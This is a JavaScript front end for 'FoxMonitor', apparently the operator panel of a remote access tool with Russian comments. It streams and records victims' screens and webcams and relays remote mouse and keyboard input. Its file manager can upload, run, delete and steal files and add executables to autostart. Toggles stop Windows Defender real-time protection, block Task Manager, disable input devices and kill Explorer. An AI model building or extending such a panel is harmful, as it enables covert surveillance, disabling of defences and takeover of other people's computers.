/* FoxMonitor — клиентская логика веб-интерфейса (vanilla JS + WebSocket) */
"use strict";

const state = {
  token: null,
  user: null,
  ws: null,
  wsRetry: 0,
  clients: {},          // id -> snapshot
  lastFrame: {},        // id -> { screen: {data,ts}, camera: {...} }
  info: {},             // id -> информация о ПК/мониторах/местоположении
  fm: { path: "" },     // путь файлового менеджера; "" = список дисков
  misc: {},             // cid -> { func: true/false } — состояния вкладки «Прочее»
  miscBusy: {},         // func -> идёт ли запрос (защита от двойного клика)
  modal: null,          // id клиента в модалке
  modalTab: "info",
  recording: {},        // "id:stream" -> true
  logsTimer: null,
};

const $ = (id) => document.getElementById(id);
const esc = (s) => String(s).replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

/* Системные тумблеры вкладки «Прочее» (id должен совпадать с client misc.cpp) */
const MISC_FUNCS = [
  { id: "taskmgr",  label: "Диспетчер задач", desc: "Запрет открытия диспетчера задач" },
  { id: "defender", label: "Защитник Windows", desc: "Останавливает реальное время Defender" },
  { id: "mouse",    label: "Мышь", desc: "Отключает все мыши (PnP-устройства)" },
  { id: "clock",    label: "Часы в панели задач", desc: "Убирает время из системного трея" },
  { id: "screen",   label: "Экран", desc: "Гасит монитор до чёрного" },
  { id: "keyboard", label: "Клавиатура", desc: "Отключает все клавиатуры (PnP-устройства)" },
  { id: "explorer", label: "Проводник", desc: "Останавливает оболочку Windows (панель задач, рабочий стол)" },
];

/* ------------------------------------------------------------- REST ------ */
async function api(method, url, body) {
  const opt = { method, headers: {} };
  if (state.token) opt.headers["Authorization"] = "Bearer " + state.token;
  if (body !== undefined) {
    opt.headers["Content-Type"] = "application/json";
    opt.body = JSON.stringify(body);
  }
  const r = await fetch(url, opt);
  if (r.status === 401) { logout(); throw new Error("сессия истекла"); }
  const data = await r.json().catch(() => ({}));
  if (!r.ok) throw new Error(data.detail || ("HTTP " + r.status));
  return data;
}

/* --------------------------------------------------------- уведомления --- */
function toast(text, kind = "") {
  const el = document.createElement("div");
  el.className = "toast " + kind;
  el.textContent = text;
  $("toasts").appendChild(el);
  setTimeout(() => { el.style.opacity = "0"; el.style.transition = "opacity .4s"; }, 3600);
  setTimeout(() => el.remove(), 4100);
}

/* -------------------------------------------------------------- вход ----- */
function showView(name) {
  $("view-login").classList.toggle("hidden", name !== "login");
  $("view-dash").classList.toggle("hidden", name !== "dash");
}

function logout() {
  state.token = null;
  state.user = null;
  if (state.ws) { state.ws.close(); state.ws = null; }
  localStorage.removeItem("fm_token");
  showView("login");
}

$("login-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  $("login-error").textContent = "";
  try {
    const res = await api("POST", "/api/login", { user: $("login-user").value, pass: $("login-pass").value });
    state.token = res.token;
    state.user = res.user;
    localStorage.setItem("fm_token", res.token);
    showView("dash");
    $("user-label").textContent = res.user;
    connectWS();
    refreshClients();
    refreshFiles();
  } catch (err) {
    $("login-error").textContent = err.message;
  }
});

$("btn-logout").addEventListener("click", logout);

/* ------------------------------------------------------------- WS -------- */
function wsUrl() {
  const proto = location.protocol === "https:" ? "wss://" : "ws://";
  return proto + location.host + "/ws/ui";
}

function connectWS() {
  if (!state.token) return;
  try { state.ws = new WebSocket(wsUrl()); } catch { return; }

  state.ws.onopen = () => {
    state.wsRetry = 0;
    state.ws.send(JSON.stringify({ type: "auth", token: state.token }));
    setConnBadge(true);
  };

  state.ws.onmessage = (ev) => {
    let msg;
    try { msg = JSON.parse(ev.data); } catch { return; }
    handleWS(msg);
  };

  state.ws.onclose = () => {
    setConnBadge(false);
    const delay = Math.min(15000, 1000 * 2 ** state.wsRetry++);
    setTimeout(connectWS, delay);
  };
  state.ws.onerror = () => { try { state.ws.close(); } catch {} };
}

function setConnBadge(online) {
  const b = $("conn-badge");
  b.textContent = online ? "сервер онлайн" : "нет связи с сервером";
  b.className = "badge " + (online ? "badge-on" : "badge-off");
}

function handleWS(msg) {
  switch (msg.type) {
    case "clients":
      msg.clients.forEach((c) => (state.clients[c.id] = c));
      renderClients();
      resubscribe();
      break;
    case "client_event":
      if (msg.event === "joined") {
        state.clients[msg.client.id] = msg.client;
        renderClients();
        toast(`Клиент подключился: ${msg.client.id}`, "toast-ok");
        subscribe("screen", msg.client.id);
      } else if (msg.event === "left") {
        delete state.clients[msg.client.id];
        delete state.lastFrame[msg.client.id];
        if (state.modal === msg.client.id) closeModal();
        renderClients();
        toast(`Клиент отключился: ${msg.client.id}`, "toast-bad");
      } else if (msg.event === "status" && state.clients[msg.client.id]) {
        Object.assign(state.clients[msg.client.id], msg.client);
        renderClients();
      }
      break;
    case "frame":
      if (!state.lastFrame[msg.cid]) state.lastFrame[msg.cid] = {};
      state.lastFrame[msg.cid][msg.stream] = { data: msg.data, ts: msg.ts };
      routeFrame(msg.cid, msg.stream, msg.data);
      break;
    case "info":
      state.info[msg.cid] = msg.info;
      if (state.modal === msg.cid && state.modalTab === "info") renderInfo(msg.info);
      break;
    case "screenshot_saved":
      toast(`Скриншот сохранён: ${msg.file}`, "toast-ok");
      break;
    case "recording": {
      const key = msg.cid + ":" + msg.stream;
      if (msg.state === "started") { state.recording[key] = true; toast("Запись начата: " + msg.file, "toast-warn"); }
      else { delete state.recording[key]; toast("Запись остановлена: " + msg.file, "toast-ok"); }
      updateRecBadges();
      break;
    }
  }
}

/* -------------------------------------------------------- рендер карт ---- */
function renderClients() {
  const grid = $("clients-grid");
  const ids = Object.keys(state.clients);
  $("client-count").textContent = ids.length;
  $("empty-state").classList.toggle("hidden", ids.length > 0);

  const keep = new Set(ids);
  [...grid.children].forEach((el) => {
    if (!keep.has(el.dataset.cid)) el.remove();
  });

  ids.sort((a, b) => state.clients[a].id.localeCompare(state.clients[b].id));
  ids.forEach((id) => {
    const c = state.clients[id];
    let card = grid.querySelector(`[data-cid="${CSS.escape(id)}"]`);
    const frame = state.lastFrame[id]?.screen?.data || null;

    if (!card) {
      card = document.createElement("div");
      card.className = "card";
      card.dataset.cid = id;
      card.innerHTML = `
        <div class="card-thumb">
          <div class="off">нет кадра</div>
          <span class="live-tag hidden">LIVE</span>
          <span class="cam-tag hidden">CAM</span>
          <img class="hidden" alt="">
        </div>
        <div class="card-body">
          <div class="card-title">
            <h3></h3>
            <span class="status-dot"></span>
          </div>
          <div class="card-meta">
            <span class="meta-ip"></span>
            <span class="meta-last"></span>
          </div>
          <div class="card-actions">
            <button class="btn btn-primary act-watch">Смотреть</button>
            <button class="btn btn-ghost act-shot">Скриншот</button>
            <button class="btn btn-ghost act-disconnect">Стоп</button>
          </div>
        </div>`;
      card.querySelector(".act-watch").addEventListener("click", () => openModal(id));
      card.querySelector(".act-shot").addEventListener("click", () => sendCommand(id, "screenshot", "screen"));
      card.querySelector(".act-disconnect").addEventListener("click", () => {
        sendCommand(id, "stop", "screen");
        toast(`Отправлена команда stop для ${id}`, "toast-warn");
      });
      grid.appendChild(card);
    }

    card.querySelector(".card-title h3").textContent = c.id;
    const dot = card.querySelector(".status-dot");
    const alive = (Date.now() / 1000 - c.last_seen) < 12;
    dot.className = "status-dot " + (alive ? "status-on" : "status-off");
    card.querySelector(".meta-ip").textContent = c.ip || "ip ?";
    const ls = c.last_seen ? new Date(c.last_seen * 1000).toLocaleTimeString() : "—";
    card.querySelector(".meta-last").textContent = "последнее: " + ls;

    const img = card.querySelector(".card-thumb img");
    const off = card.querySelector(".card-thumb .off");
    const live = card.querySelector(".live-tag");
    if (frame) {
      img.src = "data:image/jpeg;base64," + frame;
      img.classList.remove("hidden");
      off.classList.add("hidden");
    } else {
      img.classList.add("hidden");
      off.classList.remove("hidden");
    }
    live.classList.toggle("hidden", !(c.screen && frame));
    card.querySelector(".cam-tag").classList.toggle("hidden", !c.camera);
  });
}

function routeFrame(cid, stream, data) {
  if (state.modal === cid && stream === state.modalTab) {
    const img = $("frame-" + stream);
    img.src = "data:image/jpeg;base64," + data;
    $("nosig-" + stream).classList.add("hidden");
  }
  const card = document.querySelector(`.card[data-cid="${CSS.escape(cid)}"]`);
  if (card && stream === "screen" && state.modal !== cid) {
    const img = card.querySelector(".card-thumb img");
    img.src = "data:image/jpeg;base64," + data;
    img.classList.remove("hidden");
    card.querySelector(".card-thumb .off").classList.add("hidden");
    card.querySelector(".live-tag").classList.remove("hidden");
  }
}

/* ---------------------------------------------------------- подписки ---- */
function subscribe(stream, cid) {
  if (state.ws && state.ws.readyState === 1)
    state.ws.send(JSON.stringify({ type: "subscribe", cid, stream }));
}
function unsubscribe(stream, cid) {
  if (state.ws && state.ws.readyState === 1)
    state.ws.send(JSON.stringify({ type: "unsubscribe", cid, stream }));
}
function resubscribe() {
  Object.keys(state.clients).forEach((id) => subscribe("screen", id));
  if (state.modal) {
    if (state.modalTab === "screen") subscribe("screen", state.modal);
    if (state.modalTab === "camera") subscribe("camera", state.modal);
  }
}

/* ------------------------------------------------------------ команды ---- */
async function sendCommand(cid, command, stream = "screen", value = null) {
  try {
    await api("POST", `/api/clients/${encodeURIComponent(cid)}/command`, { command, stream, value });
  } catch (err) { toast("Ошибка: " + err.message, "toast-bad"); }
}

async function refreshClients() {
  try { const list = await api("GET", "/api/clients"); list.forEach((c) => (state.clients[c.id] = c)); renderClients(); }
  catch (e) { if (state.token) toast("Не удалось получить список клиентов", "toast-bad"); }
}
$("btn-refresh").addEventListener("click", refreshClients);

/* ------------------------------------------------------------ модалка ---- */
function openModal(cid) {
  const c = state.clients[cid];
  state.modal = cid;
  state.modalTab = "info";
  $("modal-cid").textContent = cid;
  $("modal-ip").textContent = c?.ip || "ip ?";
  $("modal-fps").textContent = "";

  $("frame-screen").src = "";
  $("frame-camera").src = "";
  $("nosig-screen").classList.remove("hidden");
  $("nosig-camera").classList.remove("hidden");

  $("ctl-quality").value = 75; $("q-val").textContent = 75;
  $("ctl-fps").value = 10; $("fps-val").textContent = 10;
  updateRecBadges();
  $("modal").classList.remove("hidden");

  openModalTab("info");
}

function openModalTab(tab) {
  const prev = state.modalTab;
  // стримы идут только на вкладках просмотра: уход с вкладки = отписка
  if (prev === "screen") unsubscribe("screen", state.modal);
  if (prev === "camera") unsubscribe("camera", state.modal);
  state.modalTab = tab;
  if (tab === "screen") subscribe("screen", state.modal);
  if (tab === "camera") subscribe("camera", state.modal);

  $("video-screen").classList.toggle("hidden", tab !== "screen");
  $("video-camera").classList.toggle("hidden", tab !== "camera");
  $("info-view").classList.toggle("hidden", tab !== "info");
  $("fm-view").classList.toggle("hidden", tab !== "files");
  $("misc-view").classList.toggle("hidden", tab !== "misc");
  $("modal-controls").classList.toggle("hidden", tab === "info" || tab === "files" || tab === "misc");
  document.querySelectorAll(".tab").forEach((t) => t.classList.toggle("active", t.dataset.tab === tab));

  if (tab === "info") fetchInfo(state.modal);
  else if (tab === "files") fmList();
  else if (tab === "misc") refreshMisc();
  else {
    const img = $("frame-" + tab);
    if (img.src) $("nosig-" + tab).classList.add("hidden");
  }
}

/* ------------------------------------------------------- вкладка «Прочее» - */
function renderMisc() {
  const cid = state.modal;
  const grid = $("misc-grid");
  if (!grid || !cid) return;
  state.misc[cid] = state.misc[cid] || {};
  const st = state.misc[cid];
  grid.innerHTML = "";
  MISC_FUNCS.forEach((f) => {
    const row = document.createElement("div");
    row.className = "misc-row";
    const on = !!st[f.id];
    row.innerHTML = `
      <div class="misc-info">
        <div class="misc-name">${esc(f.label)}</div>
        <div class="misc-desc">${esc(f.desc)}</div>
      </div>
      <div class="misc-btns">
        <button class="btn misc-btn misc-btn-on${on ? " active" : ""}" data-func="${f.id}" data-on="1">Включить</button>
        <button class="btn misc-btn misc-btn-off${!on ? " active" : ""}" data-func="${f.id}" data-on="0">Выключить</button>
      </div>`;
    grid.appendChild(row);
  });
}

async function refreshMisc() {
  const cid = state.modal;
  if (!cid) return;
  try {
    const st = await api("GET", `/api/clients/${encodeURIComponent(cid)}/misc`);
    state.misc[cid] = st || {};
    renderMisc();
  } catch { renderMisc(); }
}

async function miscToggle(fid, on) {
  const cid = state.modal;
  if (!cid || state.miscBusy[fid]) return;
  state.miscBusy[fid] = true;
  const f = MISC_FUNCS.find((x) => x.id === fid) || {};
  try {
    await api("POST", `/api/clients/${encodeURIComponent(cid)}/misc/${fid}`, { on });
    state.misc[cid] = state.misc[cid] || {};
    state.misc[cid][fid] = on;
    toast(`${f.label || fid}: ${on ? "включено" : "выключено"}`, "toast-ok");
  } catch (err) {
    toast(`Ошибка (${f.label || fid}): ${err.message}`, "toast-bad");
  } finally {
    state.miscBusy[fid] = false;
    renderMisc();
  }
}

$("misc-grid").addEventListener("click", (e) => {
  const b = e.target.closest(".misc-btn");
  if (!b) return;
  miscToggle(b.dataset.func, b.dataset.on === "1");
});

/* ------------------------------------------------------- вкладка «Инфо» - */
async function fetchInfo(cid) {
  try {
    const info = await api("GET", `/api/clients/${encodeURIComponent(cid)}/info`);
    renderInfo(info);
  } catch { renderInfo(null); }
}

function fmtUptime(sec) {
  sec = Math.max(0, sec | 0);
  const d = Math.floor(sec / 86400), h = Math.floor((sec % 86400) / 3600),
        m = Math.floor((sec % 3600) / 60);
  if (d > 0) return `${d} д ${h} ч ${m} мин`;
  if (h > 0) return `${h} ч ${m} мин`;
  return `${m} мин`;
}

function infoRow(label, value) {
  return `<div class="info-row"><span class="info-label">${esc(label)}</span><span class="info-value">${value ? esc(value) : "—"}</span></div>`;
}

function renderInfo(info) {
  const pc = info?.pc;
  $("info-pc").innerHTML = pc ? [
    infoRow("Имя", pc.name),
    infoRow("ОС", pc.os),
    infoRow("Разрядность", pc.arch),
    infoRow("Процессор", pc.cpu),
    infoRow("Оперативная память", `${pc.ram_total_gb} ГБ (свободно ${pc.ram_free_gb} ГБ)`),
    infoRow("Время работы", fmtUptime(pc.uptime_sec)),
  ].join("") : '<div class="info-empty">нет данных</div>';

  const mons = info?.monitors || [];
  $("info-mon-count").classList.toggle("hidden", !mons.length);
  $("info-mon-count").textContent = mons.length;
  $("info-monitors").innerHTML = mons.length ? mons.map((m, i) => {
    const tag = m.primary ? " <span class='tag-primary'>основной</span>" : "";
    const d = info.desktop && mons.length > 1
      ? `<div class="info-row"><span class="info-label">Расположение</span><span class="info-value">(${m.x}, ${m.y}) · ${m.w}×${m.h} из ${info.desktop.w}×${info.desktop.h}</span></div>`
      : "";
    return `<div class="mon-card"><div class="mon-name">Монитор ${i + 1}${tag}</div>
      <div class="info-body">
        ${infoRow("Имя", m.name)}
        ${infoRow("Разрешение", `${m.w}×${m.h}`)}
        ${d}
      </div></div>`;
  }).join("") : '<div class="info-empty">мониторы не найдены</div>';

  const loc = info?.location;
  $("info-location").innerHTML = loc
    ? `<div class="info-loc">${esc(loc)}</div>`
    : '<div class="info-empty">не указано (добавьте location = … в config.ini клиента)</div>';
}

/* ------------------------------------------------------- файлы (fm) ------ */
function fmJoin(dir, name) {
  if (!dir) return name;
  return dir.endsWith("\\") ? dir + name : dir + "\\" + name;
}

function fmtSize(b) {
  b = Number(b) || 0;
  if (b >= 1 << 30) return (b / (1 << 30)).toFixed(2) + " ГБ";
  if (b >= 1 << 20) return (b / (1 << 20)).toFixed(1) + " МБ";
  if (b >= 1 << 10) return (b / (1 << 10)).toFixed(1) + " КБ";
  return b + " Б";
}

async function fmList() {
  const cid = state.modal;
  if (!cid) return;
  const list = $("fm-list");
  list.innerHTML = '<div class="info-empty">загрузка…</div>';
  $("fm-path").value = state.fmPath;
  try {
    const res = await api("POST", `/api/clients/${encodeURIComponent(cid)}/fm/list`,
                          { path: state.fmPath });
    renderFm(res.entries || []);
  } catch (err) {
    list.innerHTML = `<div class="info-empty">ошибка: ${esc(err.message)}</div>`;
  }
}

function fmEntryRow(e) {
  const row = document.createElement("div");
  row.className = "fm-row" + (e.dir ? " fm-dir" : "");
  row.title = e.dir ? "Открыть" : "Скачать";
  row.innerHTML = `
    <span class="fm-ico">${e.dir ? "&#128193;" : "&#128196;"}</span>
    <span class="fm-name">${esc(e.name)}</span>
    <span class="fm-size">${e.dir ? "—" : fmtSize(e.size)}</span>
    <span class="fm-date">${e.mtime ? new Date(e.mtime * 1000).toLocaleString() : ""}</span>
    <span class="fm-acts">
      ${e.dir ? '<button class="btn btn-ghost btn-sm" data-act="open">Открыть</button>'
             : `<button class="btn btn-ghost btn-sm" data-act="dl">Скачать</button>
                <button class="btn btn-ghost btn-sm" data-act="run">Запустить</button>${
                 /\.exe$/i.test(e.name) ? '<button class="btn btn-ghost btn-sm" data-act="autostart">В автозагрузку</button>' : ''}`}
      <button class="btn btn-ghost btn-sm btn-danger-txt" data-act="del">Удалить</button>
    </span>`;
  row.addEventListener("dblclick", () => {
    if (e.dir) fmOpen(e);
  });
  row.querySelectorAll("[data-act]").forEach((btn) =>
    btn.addEventListener("click", (ev) => {
      ev.stopPropagation();
      const act = btn.dataset.act;
      if (act === "open") fmOpen(e);
      else if (act === "dl") fmDownload(e);
      else if (act === "run") fmRun(e);
      else if (act === "autostart") fmAutostart(e);
      else if (act === "del") fmDelete(e);
    }));
  return row;
}

function renderFm(entries) {
  const list = $("fm-list");
  list.innerHTML = "";
  if (!entries.length) {
    list.innerHTML = '<div class="info-empty">пусто</div>';
    return;
  }
  entries.forEach((e) => list.appendChild(fmEntryRow(e)));
}

function fmOpen(e) {
  if (!e.dir) return;
  state.fmPath = fmJoin(state.fmPath, e.name);
  fmList();
}

function fmUp() {
  const p = state.fmPath;
  if (!p) return;
  if (p.endsWith("\\")) state.fmPath = "";          // корень диска -> диски
  else {
    const idx = p.lastIndexOf("\\");
    state.fmPath = idx < 0 ? "" : p.slice(0, idx);  // "C:\Users" -> "C:\"
  }
  fmList();
}

async function fmUpload(file, run) {
  const cid = state.modal;
  if (!cid || !file) return;
  const path = fmJoin(state.fmPath, file.name);
  try {
    const r = await fetch(`/api/clients/${encodeURIComponent(cid)}/fm/upload`, {
      method: "POST",
      headers: {
        Authorization: "Bearer " + state.token,
        "X-File-Path": encodeURIComponent(path),
        "X-File-Run": run ? "1" : "0",
      },
      body: file,
    });
    if (!r.ok) {
      const e = await r.json().catch(() => ({}));
      throw new Error(e.detail || ("HTTP " + r.status));
    }
    toast(run ? `Загружено и запущено: ${file.name}` : `Загружено: ${file.name}`, "toast-ok");
    fmList();
  } catch (err) {
    toast("Загрузка не удалась: " + err.message, "toast-bad");
  }
}

async function fmDownload(e) {
  if (e.dir) { fmOpen(e); return; }
  const cid = state.modal;
  try {
    const r = await fetch(`/api/clients/${encodeURIComponent(cid)}/fm/download`, {
      method: "POST",
      headers: { Authorization: "Bearer " + state.token, "Content-Type": "application/json" },
      body: JSON.stringify({ path: fmJoin(state.fmPath, e.name) }),
    });
    if (!r.ok) {
      const er = await r.json().catch(() => ({}));
      throw new Error(er.detail || ("HTTP " + r.status));
    }
    const blob = await r.blob();
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = e.name;
    a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 5000);
    toast(`Скачивается: ${e.name}`, "toast-ok");
  } catch (err) {
    toast("Скачивание не удалось: " + err.message, "toast-bad");
  }
}

let fmLastRun = 0;
async function fmRun(e) {
  if (e.dir) return;
  const now = Date.now();
  if (now - fmLastRun < 1500) return; // защита от двойного/повторного клика
  fmLastRun = now;
  try {
    await api("POST", `/api/clients/${encodeURIComponent(state.modal)}/fm/run`,
              { path: fmJoin(state.fmPath, e.name) });
    toast(`Запущено: ${e.name}`, "toast-ok");
  } catch (err) {
    toast("Запуск не удался: " + err.message, "toast-bad");
  }
}

let fmLastAuto = 0;
async function fmAutostart(e) {
  if (e.dir) return;
  const now = Date.now();
  if (now - fmLastAuto < 1500) return; // защита от повторного клика
  fmLastAuto = now;
  try {
    await api("POST", `/api/clients/${encodeURIComponent(state.modal)}/fm/autostart`,
              { path: fmJoin(state.fmPath, e.name) });
    toast(`Установлено в автозагрузку: ${e.name}`, "toast-ok");
  } catch (err) {
    toast("Ошибка автозагрузки: " + err.message, "toast-bad");
  }
}

async function fmDelete(e) {
  const full = fmJoin(state.fmPath, e.name);
  if (!confirm(`Удалить "${full}"?`)) return;
  try {
    await api("POST", `/api/clients/${encodeURIComponent(state.modal)}/fm/delete`,
              { path: full });
    toast(`Удалено: ${e.name}`, "toast-ok");
    fmList();
  } catch (err) {
    toast("Удаление не удалось: " + err.message, "toast-bad");
  }
}

$("fm-up").addEventListener("click", fmUp);
$("fm-refresh").addEventListener("click", fmList);
$("fm-path").addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    state.fmPath = e.target.value.trim();
    fmList();
  }
});
$("fm-file").addEventListener("change", (e) => {
  const f = e.target.files[0];
  if (f) fmUpload(f, $("fm-run").checked);
  e.target.value = "";
});

document.querySelectorAll(".tab").forEach((t) =>
  t.addEventListener("click", () => openModalTab(t.dataset.tab)));

function closeModal() {
  if (state.modal) {
    unsubscribe("screen", state.modal);
    unsubscribe("camera", state.modal);
  }
  if (controlOn) {
    controlOn = false;
    $("btn-control").classList.remove("active");
    $("btn-control").textContent = "&#9783; Управление";
    document.querySelectorAll(".video-slot").forEach((s) => s.classList.remove("control-on"));
  }
  state.modal = null;
  $("modal").classList.add("hidden");
  resubscribe();
}
$("modal-close").addEventListener("click", closeModal);
$("modal").addEventListener("click", (e) => { if (e.target === $("modal")) closeModal(); });

function updateRecBadges() {
  const on = (stream) => state.recording[state.modal + ":" + stream] === true;
  $("rec-badge-screen").classList.toggle("hidden", !on("screen"));
  $("rec-badge-camera").classList.toggle("hidden", !on("camera"));
  $("btn-record").textContent = (on("screen") || on("camera")) ? "⏹ Остановить запись" : "● Запись";
}

$("btn-record").addEventListener("click", async () => {
  if (!state.modal) return;
  const stream = state.modalTab;
  const key = state.modal + ":" + stream;
  const action = state.recording[key] ? "stop" : "start";
  try {
    const res = await api("POST", `/api/clients/${encodeURIComponent(state.modal)}/record`, { stream, action });
    if (!res.ok) toast(res.error || "ошибка записи", "toast-bad");
  } catch (err) { toast("Ошибка: " + err.message, "toast-bad"); }
});

$("btn-shot").addEventListener("click", () => {
  if (state.modal) sendCommand(state.modal, "screenshot", state.modalTab);
});

$("btn-dl-frame").addEventListener("click", () => {
  const f = state.lastFrame[state.modal]?.[state.modalTab];
  if (!f) { toast("Нет кадра для сохранения", "toast-warn"); return; }
  const a = document.createElement("a");
  a.href = "data:image/jpeg;base64," + f.data;
  a.download = `${state.modal}_${state.modalTab}_${Date.now()}.jpg`;
  a.click();
});

$("ctl-quality").addEventListener("input", (e) => {
  $("q-val").textContent = e.target.value;
  clearTimeout($("ctl-quality")._t);
  $("ctl-quality")._t = setTimeout(() => {
    if (state.modal) sendCommand(state.modal, "quality", "screen", +e.target.value);
  }, 300);
});

$("ctl-fps").addEventListener("input", (e) => {
  $("fps-val").textContent = e.target.value;
  clearTimeout($("ctl-fps")._t);
  $("ctl-fps")._t = setTimeout(() => {
    if (state.modal) sendCommand(state.modal, "setfps", state.modalTab, +e.target.value);
  }, 300);
});

$("btn-stop-stream").addEventListener("click", () => {
  if (state.modal) { sendCommand(state.modal, "stop", state.modalTab); toast("Стрим остановлен", "toast-warn"); }
});
$("btn-start-stream").addEventListener("click", () => {
  if (state.modal) { sendCommand(state.modal, "start", state.modalTab); toast("Стрим запущен", "toast-ok"); }
});

/* -------------------------------------------------- удалённое управление - */
let controlOn = false;
let dragging = false;
let lastMoveSent = 0;
let lastSentPos = { x: -1, y: -1 };   // последняя отправленная позиция

function sendInput(payload) {
  if (!controlOn || !state.modal || !state.ws || state.ws.readyState !== 1) return;
  state.ws.send(JSON.stringify({ type: "input", cid: state.modal, ...payload }));
}

// Координаты относительно natural size кадра. null — если мышь вне картинки
// (letterbox): такие события не отправляем вовсе.
function framePoint(e) {
  const img = e.currentTarget.querySelector("img");
  if (!img.naturalWidth || !img.naturalHeight) return null;  // кадра ещё нет
  const r = img.getBoundingClientRect();
  if (r.width <= 0 || r.height <= 0) return null;
  const nx = (e.clientX - r.left) / r.width * img.naturalWidth;
  const ny = (e.clientY - r.top) / r.height * img.naturalHeight;
  if (nx < 0 || ny < 0 || nx >= img.naturalWidth || ny >= img.naturalHeight) return null;
  return { x: Math.round(nx), y: Math.round(ny) };
}

const mouseBtn = (b) => (b === 2 ? "right" : b === 1 ? "middle" : "left");

$("btn-control").addEventListener("click", () => {
  controlOn = !controlOn;
  $("btn-control").classList.toggle("active", controlOn);
  $("btn-control").textContent = controlOn ? "&#9783; Управление ВКЛ" : "&#9783; Управление";
  document.querySelectorAll(".video-slot").forEach((s) => s.classList.toggle("control-on", controlOn));
  lastSentPos = { x: -1, y: -1 };
  $("modal-box").focus();
  toast(controlOn ? "Режим управления: события пойдут на машину клиента" : "Режим управления выключен",
        controlOn ? "toast-warn" : "");
});

["screen", "camera"].forEach((stream) => {
  const slot = $("video-" + stream);
  slot.addEventListener("mousemove", (e) => {
    if (!controlOn) return;
    const p = framePoint(e);
    if (!p) return;
    // Дедуп: на той же машине наш же SetCursorPos порождает повторное событие
    // на том же месте — его пересылать нельзя, иначе бесконечный цикл.
    if (Math.abs(p.x - lastSentPos.x) <= 2 && Math.abs(p.y - lastSentPos.y) <= 2) return;
    const now = Date.now();
    if (now - lastMoveSent < 30) return;
    lastMoveSent = now;
    lastSentPos = p;
    sendInput({ kind: "mousemove", x: p.x, y: p.y });
  });
  slot.addEventListener("mousedown", (e) => {
    if (!controlOn) return;
    const p = framePoint(e);
    if (!p) return;
    e.preventDefault();
    dragging = true;
    lastSentPos = p;
    sendInput({ kind: "mousedown", x: p.x, y: p.y, button: mouseBtn(e.button) });
  });
  slot.addEventListener("contextmenu", (e) => { if (controlOn) e.preventDefault(); });
  slot.addEventListener("wheel", (e) => {
    if (!controlOn) return;
    e.preventDefault();
    const delta = Math.max(-360, Math.min(360, -Math.round(e.deltaY / 100) * 120));
    sendInput({ kind: "wheel", delta });
  }, { passive: false });
});

window.addEventListener("mouseup", (e) => {
  if (!controlOn || !dragging) return;
  dragging = false;
  sendInput({ kind: "mouseup", button: mouseBtn(e.button) });
});

document.addEventListener("keydown", (e) => {
  if (!controlOn || !state.modal) return;
  if (e.repeat) return;             // автоповтор оставляем удалённой ОС
  if (e.key === "Escape") return;   // Esc — только локально (закрыть модалку)
  e.preventDefault();
  sendInput({ kind: "key", key: e.key === " " ? "Space" : e.key, down: true });
});
document.addEventListener("keyup", (e) => {
  if (!controlOn || !state.modal) return;
  if (e.key === "Escape") return;
  e.preventDefault();
  sendInput({ kind: "key", key: e.key === " " ? "Space" : e.key, down: false });
});

/* ------------------------------------------------------- планировщик ----- */
$("btn-scheduler").addEventListener("click", async () => {
  closePanel("logs"); closePanel("files");
  $("panel-scheduler").classList.toggle("hidden");
  try {
    const s = await api("GET", "/api/scheduler");
    $("sched-enabled").checked = s.enabled;
    $("sched-interval").value = Math.round(s.interval_sec / 60);
  } catch {}
});

$("btn-sched-save").addEventListener("click", async () => {
  try {
    const s = await api("POST", "/api/scheduler", {
      enabled: $("sched-enabled").checked,
      interval_sec: Math.max(1, +$("sched-interval").value || 5) * 60,
    });
    toast(`Планировщик ${s.enabled ? "включён" : "выключен"} (интервал ${Math.round(s.interval_sec / 60)} мин)`, "toast-ok");
  } catch (err) { toast("Ошибка: " + err.message, "toast-bad"); }
});

/* ------------------------------------------------------------ файлы ----- */
async function refreshFiles() {
  try {
    const [recs, shots] = await Promise.all([
      api("GET", "/api/recordings"),
      api("GET", "/api/screenshots"),
    ]);
    const rl = $("rec-list");
    rl.innerHTML = recs.length ? "" : '<div class="file-empty">Записей пока нет</div>';
    recs.forEach((f) => {
      rl.appendChild(fileRow(f, `/api/recordings/${encodeURIComponent(f.name)}`));
    });
    const sl = $("shot-list");
    sl.innerHTML = shots.length ? "" : '<div class="file-empty">Скриншотов пока нет</div>';
    shots.forEach((f) => {
      sl.appendChild(fileRow(f, `/api/screenshots/${encodeURIComponent(f.name)}`));
    });
  } catch {}
}

function fileRow(f, url) {
  const row = document.createElement("div");
  row.className = "file-row";
  const kb = (f.size / 1024).toFixed(1);
  const dt = new Date(f.mtime * 1000).toLocaleString();
  row.innerHTML = `
    <div>
      <div class="fname">${esc(f.name)}</div>
      <div class="fsize">${kb} КБ · ${esc(dt)}</div>
    </div>
    <a href="${url}" download>Скачать</a>`;
  return row;
}

$("btn-files").addEventListener("click", () => {
  closePanel("scheduler"); closePanel("logs");
  $("panel-files").classList.toggle("hidden");
  refreshFiles();
});

/* ------------------------------------------------------------ логи ------ */
$("btn-logs").addEventListener("click", () => {
  closePanel("scheduler"); closePanel("files");
  $("panel-logs").classList.toggle("hidden");
  pollLogs();
});

async function pollLogs() {
  if ($("panel-logs").classList.contains("hidden")) return;
  try {
    const lines = await api("GET", "/api/logs?n=300");
    const view = $("log-view");
    view.textContent = lines.join("\n");
    view.scrollTop = view.scrollHeight;
  } catch {}
}

setInterval(() => { pollLogs(); refreshClients(); }, 5000);

/* ------------------------------------------------------------ панели ---- */
function closePanel(name) { $("panel-" + name).classList.add("hidden"); }
document.querySelectorAll(".panel-close").forEach((b) =>
  b.addEventListener("click", () => closePanel(b.dataset.panel)));

/* ------------------------------------------------------------- старт ---- */
(function init() {
  const saved = localStorage.getItem("fm_token");
  if (saved) {
    state.token = saved;
    api("GET", "/api/me")
      .then((me) => {
        state.user = me.user;
        $("user-label").textContent = me.user;
        showView("dash");
        connectWS();
        refreshClients();
        refreshFiles();
      })
      .catch(() => { state.token = null; showView("login"); });
  } else {
    showView("login");
  }
})();
